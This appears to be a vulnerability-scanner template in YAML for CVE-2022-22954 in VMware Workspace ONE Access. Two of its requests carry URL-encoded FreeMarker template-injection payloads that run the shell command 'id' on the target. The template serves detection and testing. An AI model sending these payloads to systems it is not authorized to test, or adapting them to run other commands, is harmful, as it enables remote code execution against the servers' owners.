id: yaml-poc-vmware-cloud_foundation-rce-CVE-2022-22954
info:
  name: Yaml Poc Vmware Cloud_Foundation Rce Cve 2022 22954
  author: jiapeng.han
  severity: critical
  description: 'Converted from xpoc: yaml-poc-vmware-cloud_foundation-rce-CVE-2022-22954'
  tags: vmware,rce,cve
  classification:
    cve-id: CVE-2022-22954
  reference:
  - http://packetstormsecurity.com/files/166935/VMware-Workspace-ONE-Access-Template-Injection-Command-Execution.html
  - https://cxsecurity.com/cveshow/CVE-2022-22954/
  - https://cxsecurity.com/issue/WLB-2022050016
  - https://packetstormsecurity.com/files/166935/VMware-Workspace-ONE-Access-Template-Injection-Command-Execution.html
  - https://www.cybersecurity-help.cz/vdb/SB2022040616
http:
- method: GET
  path:
  - /SAAS/auth/login
  matchers-condition: and
  matchers:
  - type: status
    status:
    - 200
  - type: word
    part: body
    words:
    - Workspace ONE Access
- method: GET
  path:
  - /catalog-portal/ui/oauth/verify?error=&deviceUdid=%24%7b%22%66%72%65%65%6d%61%72%6b%65%72%2e%74%65%6d%70%6c%61%74%65%2e%75%74%69%6c%69%74%79%2e%45%78%65%63%75%74%65%22%3f%6e%65%77%28%29%28%22%69%64%22%29%7d
  headers:
    Host: localhost
  matchers-condition: and
  matchers:
  - type: status
    status:
    - 400
- method: GET
  path:
  - /catalog-portal/ui?code=&deviceType=%24%7b%22%66%72%65%65%6d%61%72%6b%65%72%2e%74%65%6d%70%6c%61%74%65%2e%75%74%69%6c%69%74%79%2e%45%78%65%63%75%74%65%22%3f%6e%65%77%28%29%28%22%69%64%22%29%7d
  headers:
    Host: localhost
  matchers-condition: and
  matchers:
  - type: status
    status:
    - 400
